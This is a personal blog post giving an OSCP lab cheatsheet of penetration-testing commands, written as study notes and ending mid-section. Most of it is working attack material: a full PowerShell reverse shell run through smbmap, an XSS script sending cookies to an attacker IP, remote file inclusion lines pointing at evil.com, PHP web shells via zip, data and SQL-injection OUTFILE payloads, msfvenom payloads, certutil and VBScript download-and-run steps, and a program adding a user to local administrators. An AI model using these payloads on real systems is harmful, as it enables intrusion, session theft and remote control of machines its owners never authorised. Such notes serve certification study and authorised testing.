+++
title = "My OSCP Cheatsheet"
date = 2019-05-25
[taxonomies]
tags = ["personal"]
+++

Here is my OSCP cheatsheet that I've made for myself throughout the nightly lab sessions. I know there are plenty of cheatsheets out there and I don't think mine is even that great. Although, I still use this cheatsheet regularly and add commands that I frequently used. I hope this will help those who are looking for quick commands or insights on approaching the OSCP lab machines.

## Holy Grail of Guides

[https://sushant747.gitbooks.io/total-oscp-guide/](https://sushant747.gitbooks.io/total-oscp-guide/)

[https://github.com/wwong99/pentest-notes/blob/master/oscp_:/OSCP-Survival-Guide.md](https://github.com/wwong99/pentest-notes/blob/master/oscp/OSCP-Survival-Guide.md)

[https://guide.offsecnewbie.com/general-methodology](https://guide.offsecnewbie.com/general-methodology)

[https://github.com/Snifer/security-cheatsheets](https://github.com/Snifer/security-cheatsheets) - Cheatsheet for security tools

[https://github.com/xapax/oscp/blob/master/templates](https://github.com/xapax/oscp/blob/master/templates) - Windows/Linux templates

[http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html) - Windows PrivEsc

[https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/) - Linux PrivEsc

[https://guif.re/linuxeop](https://guif.re/linuxeop) - Linux PrivEsc

[http://netsec.ws/?p=180](http://netsec.ws/?p=180) - Windows buffer overflow

[https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/](https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/) - Windows buffer overflow

[https://github.com/justinsteven/dostackbufferoverflowgood](https://github.com/justinsteven/dostackbufferoverflowgood) - Windows buffer overflow guide - MUST READ!

***

## Holy Grail of Tools and Lists

[https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits) - Windows Pre-compiled Kernel Exploits

[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20:/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20:/Windows%20-%20Privilege%20Escalation.md) - Windows PrivEsc

[https://github.com/M4ximuss/Powerless](https://github.com/M4ximuss/Powerless) - Windows PrivEsc

[https://github.com/0x00-0x00/ShellPop](https://github.com/0x00-0x00/ShellPop) - Generate easy and sophisticated reverse or bind shell commands to help you during penetration tests

[https://github.com/gchq/CyberChef](https://github.com/gchq/CyberChef) - A web app for encryption, encoding, compression and data analysis 

[https://github.com/Tib3rius/AutoRecon](https://github.com/Tib3rius/AutoRecon) - Must have enumeration tool for OSCP

[https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng) - Windows Exploit Suggester

[https://github.com/infosecn1nja/Red-Teaming-Toolkit](https://github.com/infosecn1nja/Red-Teaming-Toolkit) - List of big guns that you don't need for OSCP but worth checking out.

[https://gtfobins.github.io/?fbclid=IwAR347a0JfcwvrGCALNupL8vpOyOfQCcAhuhikcs5dMY6mSxw11JpYXsk0dU#+suid](https://gtfobins.github.io/?fbclid=IwAR347a0JfcwvrGCALNupL8vpOyOfQCcAhuhikcs5dMY6mSxw11JpYXsk0dU#+suid) - Collects legitimate functions of Unix binaries that can be abused to break out restricted shells, escalate or maintain elevated privileges, transfer files, spawn bind and reverse shells, and facilitate the other post-exploitation tasks.

* * *

## Exploit Chain

:question: How to find out if I have initial read/write access to the system:
  - Port scan
  - Connect to the ports via associated tools and see what I can read and/or upload or put stuff
  - Ports that take credentials: try to brute force or try common sets of credentials

:question: When do I have to bypass authentication in a web app?
  - If I can't get initial read/write access to the file system

:question: If you have read access to the file system like an LFI or directory tranversal, what do you need to make it a shell?
  - You need write access to the file system or database somewhere else and ability to execute using LFI or directory traversal

:question: How do you bypass authentication in a web app?
  - Guess the password
  - Bypass the password by authentication bypass
  - Exploit the system to generate a new user
  - If you want higher authentication to do what you need, you look for a privilege escalation
  - Find credentials in notes that are accessible or in the manual

:question: How do you get write access to the file system or database from read-only web app access?
  - Scour through the app until you find an LFI or RFI exploit
  - Scour through the app until you find a place to upload a file
  - Scour through the app tickets, notes, posts to see if you can find clues or credentials

:question: How do out find out if you have read access to the file system or database through unauthenticated access to a web app?
  - Use `nikto` or `dirb` and go through the pages to see what you can find
  - Look for directory traversal exploits
  - Look for LFI/RFI exploits
  - Look for data leakage exploits
  - Look for credentials in files that are found by `nikto` or `dirb`
  - Look at the source code in pages that were found in `nikto` or `dirb`

***

## DNS Enumeration

Zone transfer vulnerability:

```
dnsrecon -d zonetransfer.me -t axfr
```

```
host -t ns zonetransfer.me
```

```
host -l zonetransfer.me <nameserver>
```

```
host -t mx zonetransfer.me
```

```
host zonetransfer.me
```

```
dnsenum zonetransfer.me
```

***

## Website Enumeration

Nikto HTTP(s) scanning:

```
nikto -h 10.11.1.115:443
```

```
dirb http://10.11.1.115
```

Burp Suite PUT request to create file:

```
PUT /scripts/helloworld.php HTTP/1.1
Host: 10.11.1.13
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 25

<?php echo("Success"); ?>
```

ASP IIS enumeration hacking: 

[https://github.com/maestron/hacking-tutorials/blob/master/Guide%20to%20IIS%20Exploitation.txt](https://github.com/maestron/hacking-tutorials/blob/master/Guide%20to%20IIS%20Exploitation.txt)

***

## Nmap Commands ##

[https://highon.coffee/blog/nmap-cheat-sheet/](https://highon.coffee/blog/nmap-cheat-sheet/)

Nmap TCP - Quick

```
if [ $# -ne 2 ]; then
    echo "Usage: nmap-tcp-quick.sh <TARGET> <OUTPUT-FILENAME>"
        exit 1
	fi
	
	nmap -Pn -sS --stats-every 3m --max-retries 1 --max-scan-delay 20 --defeat-rst-ratelimit -T4 -p1-65535 -oA $2 $1
```

Nmap TCP - Full

```
if [ "$#" -ne 3 ]; then
	echo "Usage: nmap-tcp-full.sh <TCP-QUICK-RESULTS.XML> <TARGET> <OUTPUT-FILENAME>"
		exit 1
		fi
		
		nmap -nvv -Pn -sSV -T1 -p$(cat $1 | grep portid | grep protocol=\"tcp\" | cut -d'"' -f4 | paste -sd "," -) --version-intensity 9 -A
		-oA $3 $2
```

nmap UDP - Quick

```
if [ $# -ne 2 ]; then
    echo "Usage: nmap-udp-quick.sh <TARGET> <OUTPUT-FILENAME>"
        exit 1
	fi
	
	nmap -Pn --top-ports 1000 -sU --stats-every 3m --max-retries 1 -T3 -oA $2 $1
```

nmap UDP - Full

```
if [ "$#" -ne 3 ]; then
	echo "Usage: nmap-udp-full.sh <UDP-QUICK-RESULTS.XML> <TARGET> <OUTPUT-FILENAME>"
		exit 1
		fi
		
		nmap -nvv -Pn -sSV -T1 -p$(cat $1 | grep portid | grep protocol=\"udp\" | cut -d'"' -f4 | paste -sd "," -) --version-intensity 9 -A -oA $3 $2
```

nmap HTTP-put command to check for PUT request:

```
nmap -v -p 80 --script=http-put --script-args http-put.url='/mrtg/scripts.php',http-put.file='./rs.php' 10.11.1.22
```

***

## SMB Commands

SMB null session enumeration:

```
enum4linux -a 10.11.1.115
```

NetBIOS enumeration:

```
nmap -v -p 139,445 -oG netbios-smb.log 10.11.1.115
```

```
nbtscan -r 10.11.1.0/24
```

Nmap SMB NSE scripts: /usr/share/nmap/scripts

```
nmap -v -p 139,445 --script=smb-os-discovery 10.11.1.115
```

```
nmap -v -p 139,445 --script=smb-vuln-ms08-067 --script-args=unsafe=1 10.11.1.115
```

```
nmap -v -p 139,445 --script=smb-vuln* 10.11.1.5
```

```
nmap -v -p 139,445 --script=smb* 10.11.1.115
```

***

### SMBClient commands

List all SMB share folders:
```
smbclient -L 10.11.1.136 -N
```

Read shared folder:
```
smbclient //10.11.1.136/Bob\ Share -N
```

If you wanted to download a copy of files/folders without prompt and in recursive mode:
```
smb:> recurse
smb:> prompt
smb:> mget *
```

***

### SMBMap Commands

https://github.com/ShawnDEvans/smbmap

Show shares (or null sessions) on the host:
```
smbmap -H 10.11.1.223
```

Show shares using credentials on the host:
```
smbmap -H 10.11.1.223 -d thinc.local -u username -p password
```

Command execution using `smbmap`:

```
$ python smbmap.py -u ariley -p 'P@$$w0rd1234!' -d ABC -x 'net group "Domain Admins" /domain' -H 192.168.2.50
```

Nifty `smbmap` reverse shell (make sure you change the IP address):
```
python smbmap.py -u jsmith -p 'R33nisP!nckle' -d ABC -H 192.168.2.50 -x 'powershell -command "function ReverseShellClean {if ($c.Connected -eq $true) {$c.Close()}; if ($p.ExitCode -ne $null) {$p.Close()}; exit; };$a=""""192.168.0.153""""; $port=""""4445"""";$c=New-Object system.net.sockets.tcpclient;$c.connect($a,$port) ;$s=$c.GetStream();$nb=New-Object System.Byte[] $c.ReceiveBufferSize  ;$p=New-Object System.Diagnostics.Process  ;$p.StartInfo.FileName=""""cmd.exe""""  ;$p.StartInfo.RedirectStandardInput=1  ;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.UseShellExecute=0  ;$p.Start()  ;$is=$p.StandardInput  ;$os=$p.StandardOutput  ;Start-Sleep 1  ;$e=new-object System.Text.AsciiEncoding  ;while($os.Peek() -ne -1){$out += $e.GetString($os.Read())} $s.Write($e.GetBytes($out),0,$out.Length)  ;$out=$null;$done=$false;while (-not $done) {if ($c.Connected -ne $true) {cleanup} $pos=0;$i=1; while (($i -gt 0) -and ($pos -lt $nb.Length)) { $read=$s.Read($nb,$pos,$nb.Length - $pos); $pos+=$read;if ($pos -and ($nb[0..$($pos-1)] -contains 10)) {break}}  if ($pos -gt 0){ $string=$e.GetString($nb,0,$pos); $is.write($string); start-sleep 1; if ($p.ExitCode -ne $null) {ReverseShellClean} else {  $out=$e.GetString($os.Read());while($os.Peek() -ne -1){ $out += $e.GetString($os.Read());if ($out -eq $string) {$out="""" """"}}  $s.Write($e.GetBytes($out),0,$out.length); $out=$null; $string=$null}} else {ReverseShellClean}};"'
```

***

## SNMP Commands

Scan for open SNMP ports:

```
nmap -sU --open -p 161 10.11.1.1-254 -oG snmplog.txt
```

Using `onesixtyone` tool:

```
echo public > community
echo private >> community
echo manager >> community
for ip in $(seq 1 254); do echo 10.11.1.$ip; done > iplist
onesixtyone -c community -i iplist
```

Using `snmpwalk` tool to enumerate entire MIB tree: 

```
snmpwalk -c public -v1 10.11.1.219
```

Enumerating Windows users:

```
snmpwalk -c public -v1 10.11.1.204 1.3.6.1.4.1.77.1.2.25
```

Enumerating Windows processes:

```
snmpwalk -c public -v1 10.11.1.204 1.3.6.1.2.1.25.4.2.1.2
```

Enumerating Open TCP Ports:

```
snmpwalk -c public -v1 10.11.1.204 1.3.6.1.2.1.6.13.1.3
```

Enumerating installed software:

```
snmpwalk -c public -v1 10.11.1.204 1.3.6.1.2.1.25.6.3.1.2
```

Using `snmp-check` tool to see what is running on the system, network information, user information and etc: 

```
snmp-check -v1 -c public 10.1.1.13
```

***

## RPC Bind Enumeration (Port 135)

List all RPC shares:

```
rpcinfo -p 10.11.1.209
```

RPC Nmap script:

```
nmap -v -p 111,845 --script=rpcinfo 10.11.1.8
```

***

## NFS Enumeration

```
sudo mount -t nfs 10.10.10.180:/ ./nfs/ -nolock
```

```
sudo showmount -e 10.10.10.180
```

## Vulnerability Scanning

Nmap scanning: /usr/share/nmap/scripts

Nmap port 80 scanning:

```
nmap -v -p 80 --script=http-vuln-cve2010-2861 10.11.1.210
```

Nmap port 21 scanning:

```
nmap -v -p 21 --script=ftp-anon.nse 10.11.1.1-254
```

Nmap SMB scanning:

```
nmap -v -p 139,445 --script=smb-security-mode 10.11.1.236
```

***

## MSFVenom Commands

List all payloads:

```
msfvenom -l payloads
```

Show all options for selected payload:

```
msfvenom -p java/jsp_shell_reverse_tcp --list-options
```

Creating Windows bind shells:

```
msfvenom -p windows/shell_bind_tcp -f exe -o <Filename.exe> LPORT=<BindPort>
```

```
msfvenom -p windows/shell_bind_tcp -f dll -o <Filename.dll> LPORT=<BindPort>
```

Encoding a payload example:
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.40 LPORT=4444 -e x86/shikata_ga_nai -f exe -o payload.exe
```

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -e x86/shikata_ga_nai -i 3 -f exe -o payload.exe
```

Remove bad characters example:
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -b "\x00" -f exe -o payload.exe
```

Example Creating executable payload using putty.exe as template:
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -x putty.exe -f exe > evilputty.exe
```

Output format options (-f):
```
asp, aspx, aspx-exe, dll, elf, elf-so, exe, exe-only, exe-service, exe-small, loop-vbs, macho, msi, msi-nouac, osx-app, psh, psh-net, psh-reflection, vba, vba-exe, vbs, war
```

Transform format options:
```
bash, c, csharp, dw, dword, hex, java, js_be, js_le, num, perl, pl, powershell, ps1, py, python, raw, rb, ruby, sh, vbapplication, vbscript
```

***

## MSFConsole Commands

[https://spreadsecurity.github.io/2016/11/17/attack-simulation-from-no-access-to-domain-admin.html](https://spreadsecurity.github.io/2016/11/17/attack-simulation-from-no-access-to-domain-admin.html)

Using `multi/handler`:
```
1. use multi/handler
2. set payload windows/meterpreter/reverse_tcp
3. set LHOST <Listening_IP> (for example set LHOST 192.168.5.55)
4. set LPORT <Listening_Port> (for example set LPORT 4444)
5. exploit
```

If the meterpreter session dies shortly after establishing the connection, try stablizing the connection by migrating to another process:

```
set AUTORUNSCRIPT post/windows/manage/migrate
```

Or use another type of process thread:

```
set exitfunc seh
```

```
set exitfunc thread
```

***

## Searchsploit Commands

Look for exploits using findings from Nmap scans:

```
searchsploit -x --nmap full_tcp_nmap.xml
```

***

## Tips and Tricks for File Transferring

Can't upload reverse shell due to file restrictions:

- Content-Type —> Change the parameter in the request header using Burp, ZAP etc.
- Put server executable extensions like ```file.php5, file.shtml, file.asa, file.cert```
- Changing letters to capital form ```file.aSp``` or ```file.PHp3```
- Using trailing spaces and/or dots at the end of the filename like ```file.asp… … . . .. .. , file.asp , file.asp.```
- Use of semicolon after the forbidden extension and before the permitted extension example: file.asp;.jpg (Only in IIS 6 or prior)
- Upload a file with 2 extensions ```file.php.jpg```
- Use of null character —> file.asp%00.jpg
- Create a file with a forbidden extension —> ```file.asp:.jpg or file.asp::$data```
- Combination of the above

***

## Linux File Transferring 

Quickly setup a ftp server:

```
python -m pyftpdlib --directory ./ --port=21 --write
```

Quickly setup a web server:

```
python -m SimpleHTTPServer 80
```

***

## Windows File Transferring

Compressing directory or files using Powershell

```
$source = "C:\folder"
$dest = "C:\compressed.zip"
Add-Type -assembly "system.io.compression.filesystem"
[io.compression.zipfile]::CreateFromDirectory($source,$dest)
```

Using Impacket, start SMB server by running `smbserver.py`

```
python3 smbserver.py myshare /tmp/smbshare/ -smb2
```

This will share /tmp/smbshare directory over SMB as `myshare`. You can also use Windows to mount the share as well.

```
net use Z: \\<IP>\myshare
```

Copy file to the /tftp and grab it from Windows machine:

```
atftpd --daemon --port 69 /tftp
```

Run on Windows machine:

```
tftp -i 10.11.0.219 get nc.exe
```

Download files over FTP non-interactively:

```bat
echo open 10.11.0.219 21> ftp.txt
echo USER offsec>> ftp.txt
echo ftp>> ftp.txt
echo bin >> ftp.txt
echo GET nc.exe >> ftp.txt
echo bye >> ftp.txt

ftp -v -n -s:ftp.txt
```

```bat
echo open 10.11.0.219 21> ftp.txt
echo USER anonymous>> ftp.txt
echo ftp>> ftp.txt
echo bin >> ftp.txt
echo GET fgdump.exe >> ftp.txt
echo GET cachedump.exe >> ftp.txt
echo GET PwDump.exe >> ftp.txt
echo GET servpw.exe >> ftp.txt
echo bye >> ftp.txt

ftp -v -n -s:ftp.txt
```

```bat
echo open 10.11.0.219 21> ftp.txt
echo USER anonymous>> ftp.txt
echo ftp>> ftp.txt
echo bin >> ftp.txt
echo GET wce32.exe >> ftp.txt
echo bye >> ftp.txt

ftp -v -n -s:ftp.txt
```

VBScript that acts like wget:

```vb
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

Then to execute the script wget.vbs script:

```
cscript wget.vbs http://10.11.0.219/evil.exe evil.exe
```

Powershell script that acts like wget:

```powershell
echo $storageDir = $pwd > wget.ps1
echo $webclient = New-Object System.Net.WebClient >>wget.ps1
echo $url = "http://10.11.0.219/evil.exe" >>wget.ps1
echo $file = "new-exploit.exe" >>wget.ps1
echo $webclient.DownloadFile($url,$file) >>wget.ps1
```

To execute the wget.ps1 file:

```
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
```

File transfer using `certutil.exe`:

```
certutil.exe -urlcache -split -f "http://10.11.0.219/fgdump.exe" fgdump.exe
```

`Debug.exe` is an assembler, disassembler, and hex dumping tool:

1.	```
	locate nc.exe|grep binaries
	```

2.	```
	cp /usr/share/windows-binaries/nc.exe .
	```

3. 	```
	ls -l nc.exe
	```

4. 	```
	upx -9 nc.exe - upx compacts the file size
	```

5. 	```
	locate exe2bat
	```

6. 	```
	cp /usr/share/windows-binaries/exe2bat.exe .
	```

7. 	```
	wine exe2bat.exe nc.exe nc.txt
	```
	Convert .exe to .txt file for victim's debug.exe to be unpacked.

***

## Web Application Attacks

Test to see if site is vulnerable to XSS:

```
<script>alert("XSS")</script>
```

Stealing cookies and session information:

```
<script>new Image().src="http://10.11.0.219/bogus.php?output="+document.cookie;</script>
```

Once the script tag is in place, run ''nc'' to capture the cookie when the user loads the page:

```
nc -nvlp 80
```

Bypass file upload filtering and restrictions:

```
php - phtml, .php, .php3, .php4, .php5, and .inc
asp - asp, .aspx
perl - .pl, .pm, .cgi, .lib
jsp - .jsp, .jspx, .jsw, .jsv, and .jspf
Coldfusion - .cfm, .cfml, .cfc, .dbm
```

***

## Local File Inclusion (LFI)

[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md)

In the following examples we include the /etc/passwd file.

```
http://example.com/index.php?page=../../../etc/passwd
```

#### Null Byte

```
http://example.com/index.php?page=../../../etc/passwd%00
```

#### Double encoding

```
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```

#### Path and dot truncation

On most PHP installations a filename longer than 4096 bytes will be cut off so any excess chars will be thrown away.

```
http://example.com/index.php?page=../../../etc/passwd............[ADD MORE]
http://example.com/index.php?page=../../../etc/passwd\.\.\.\.\.\.[ADD MORE]
http://example.com/index.php?page=../../../etc/passwd/./././././.[ADD MORE]
http://example.com/index.php?page=../../../[ADD MORE]../../../../etc/passwd
```

##### Filter bypass tricks

```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc
```

***

## Remote File Inclusion (RFI)

[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md)

Most of the filter bypasses from LFI section can be reused for RFI.

```
http://example.com/index.php?page=http://evil.com/shell.txt
```

### Null byte

```
http://example.com/index.php?page=http://evil.com/shell.txt%00
```

### Double encoding

```
http://example.com/index.php?page=http:%252f%252fevil.com%252fshell.txt
```

### Bypass allow_url_include

When allow_url_include and `allow_url_fopen` are set to `Off`. It is still possible to include a remote file on Windows box using the smb protocol.

- Create a share open to everyone
- Write a PHP code inside a file : shell.php
- Include it ```%%http://example.com/index.php?page=\\10.0.0.1\share\shell.php%%```

***

## LFI / RFI using wrappers

[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md)

### Wrapper php://filter

The part %%php://filter%% is case insensitive

```
http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php
http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
http://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php
```

can be chained with a compression wrapper for large files.

```
http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
```

NOTE: Wrappers can be chained:
```
php://filter/convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=%s''
```

### Wrapper zip://

```
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;  
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php
```

### Wrapper data://

```
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```

Fun fact: you can trigger an XSS and bypass the Chrome Auditor with: `http://example.com/index.php?page=data:application/x-httpd-php;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+`

### Wrapper expect://

```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```

### Wrapper input://

Specify your payload in the POST parameters

```
http://example.com/index.php?page=php://input
POST DATA: <?php system('id'); ?>
```

### Wrapper phar://

Create a phar file with a serialized object in its meta-data.

```
// create new Phar
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); ? >');

// add object of any class as meta data
class AnyClass {}
$object = new AnyClass;
$object->data = 'rips';
$phar->setMetadata($object);
$phar->stopBuffering();
```

If a file operation is now performed on our existing Phar file via the %%phar://%% wrapper, then its serialized meta data is unserialized. If this application has a class named AnyClass and it has the magic method __destruct() or __wakeup() defined, then those methods are automatically invoked

```
class AnyClass {
    function __destruct() {
        echo $this->data;
    }
}
// output: rips
include('phar://test.phar');
```

NOTE: The unserialize is triggered for the `%%phar://%%` wrapper in any file operation, file_exists and many more.

## SQL Injection

[https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/](https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/)

POST request SQL injection:

```
q=injection&lang=en 'union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/xampp/htdocs/bd.php%00''
```

***

## MSSQL Commands

[https://www.hackingloops.com/how-to-hack-windows-servers-using-privilege-escalation/](https://www.hackingloops.com/how-to-hack-windows-servers-using-privilege-escalation/)

Connect MSSQL server:

```
sqsh -S 10.11.1.227:27900 -U sa -P password
```

Check currently logged in user:

```
exec xp_cmdshell 'whoami'
go
```

If you have SYSTEM privileges, proceed with uploading reverse shell payload and execute.

***

## Tomcat Manager

Create reverse shell payload using WAR format:

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.11.0.219 LPORT=4444 -f war -o reverse.war
```

***

## Brute Force and Cracking

Hydra supported services:

```
adam6500 asterisk cisco cisco-enable cvs firebird ftp ftps http[s]-{head|get|post} http[s]-{get|post}-form http-proxy
http-proxy-urlenum icq imap[s] irc ldap2[s] ldap3[-{cram|digest}md5][s] mssql mysql nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] postgres
radmin2 rdp redis rexec rlogin rpcap rsh rtsp s7-300 sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey svn teamspeak telnet[s] vmauthd vnc xmpp
```

Hydra HTTP-POST-FORM request:

```
hydra -l root@localhost -P /usr/share/wordlists/word.txt 10.11.1.39 http-post-form "/otrs/index.pl:Action=Login&RequestedURL=&Lang=en&TimeOffset=300&User=^USER^&Password=^PASS^:Login Failed" -V
```

Find Hash type:

[https://hashkiller.co.uk](https://hashkiller.co.uk)

Cracking passwords using CPU:

```
john --wordlist=/usr/share/wordlists/rockyou.txt 127.0.0.1.pwdump
```

Cracking passwords using GPU:

```
hashcat -m 500 -a 0 -o output.txt -remove hashes.txt /usr/share/wordlists/rockyou.txt
```

Cracking /etc/shadow:

```
unshadow /etc/passwd /etc/shadow /tmp/combined; john --wordlist=<any word list> /tmp/combined
```

Online rainbow tables:

[https://crackstation.net/](https://crackstation.net/)

[http://www.cmd5.org/](http://www.cmd5.org/)

[http://crackhash.com/](http://crackhash.com/)

[https://hashkiller.co.uk/md5-decrypter.aspx](https://hashkiller.co.uk/md5-decrypter.aspx)

[https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com/)

[http://rainbowtables.it64.com/](http://rainbowtables.it64.com/)

[http://www.md5online.org/](http://www.md5online.org/)

***

## Tips and Tricks for Windows Privilege Escalation

Windows privesc scripts and binaries:

[https://github.com/jivoi/pentest/tree/master/exploit_win](https://github.com/jivoi/pentest/tree/master/exploit_win)

[https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)

[https://hackingandsecurity.blogspot.com/2017/09/oscp-windows-priviledge-escalation.html](https://hackingandsecurity.blogspot.com/2017/09/oscp-windows-priviledge-escalation.html) - Great list for Windows XP

[https://github.com/3ndG4me/AutoBlue-MS17-010](https://github.com/3ndG4me/AutoBlue-MS17-010) - Great exploit for windows 2000 to Windows 10

[https://medium.com/@sdgeek/hack-the-box-htb-blue-115b3f563125](https://medium.com/@sdgeek/hack-the-box-htb-blue-115b3f563125) - MS17-010 Exploit tutorial

## Windows Privilege Escalation

[https://www.youtube.com/playlist?list=PLjG9EfEtwbvIrGFTx4XctK8IxkUJkAEqP](https://www.youtube.com/playlist?list=PLjG9EfEtwbvIrGFTx4XctK8IxkUJkAEqP)

Gathering information of the system:

[http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)

```
systeminfo | findstr /B /C:”OS Name” /C:”OS Version”
```

```
ver
```

```
hostname
```

```
whoami
```

```
echo %username%
```

```
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" hostname echo %username% net users ipconfig /all route print arp -A netstat -ano netsh firewall show state netsh firewall show config shtasks /query /fo LIST /v tasklist /SVC net start
```

Check list of installed Windows patches:

```
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

Windows exploit suggester:

[https://github.com/GDSSecurity/Windows-Exploit-Suggester](https://github.com/GDSSecurity/Windows-Exploit-Suggester)

Potential files containing passwords:

```
c:\sysprep.inf
```

```
c:\sysprep\sysprep.xml
```

```
%WINDIR%\Panther\Unattend\Unattended.xml
```

```
%WINDIR%\Panther\Unattended.xml
```

```
c:\unattend.txt
```

```
c:\sysprep.ini - [Clear Text]
```

```
c:\sysprep\sysprep.xml - [Base64]
```

```
findstr /si password *.txt | *.xml | *.ini
```

```
reg query HKLM /s | findstr /i password > temp.txt
```

```
reg query HKCU /s | findstr /i password > temp.txt
```

```
reg query HKLM /f password /t REG_SZ /s
```

```
reg query HKCU /f password /t REG_SZ /s
```

Windows Python Installer to run a single .py script as an .exe file:

1. Install python on Windows machine.
2. Extract pyinstaller.zip
3. `python pyinstaller.py --onefile ms11-080.py`

Check insecure permissions, create malicious code and replace the .exe with insecure permissions:

```
icacls scsiaccess.exe
```

```c
#include <stdlib.h>

int main ()
{
  int i;
  i=system ("net localgroup administrators low /add");
  return 0;
}
```

```
i686-w64-mingw32-gcc -o scsiaccess.exe useradd.c
```

Cross compile exploits:


1. ```cp /usr/share/exploitdb/platforms/windows/local/<exploit>.c /tmp/```
2. ```cd /root/.wine/drive_c/MinGW/bin```
3. ```wine gcc –o w00t.exe /tmp/<exploit>.c -l lib```

Runas Account command:

```
runas /user:offsec-labs\low cmd.exe
```

Add user to local group:

```
accesschk.exe -uwqs users c:\*.*
```

```
accesschk.exe -uwqs “Authenticated Users” c:\*.*
```

```
cacls "c:\Program Files" /T | findstr Users
```

Find weak service permissions:

```
accesschk.exe -uwcqv *
```

Accesschk.exe for Windows XP:

[https://web.archive.org/web/20080530012252/http://live.sysinternals.com/accesschk.exe](https://web.archive.org/web/20080530012252/http://live.sysinternals.com/accesschk.exe)

Accesschk.exe commands to find read/write services:

```
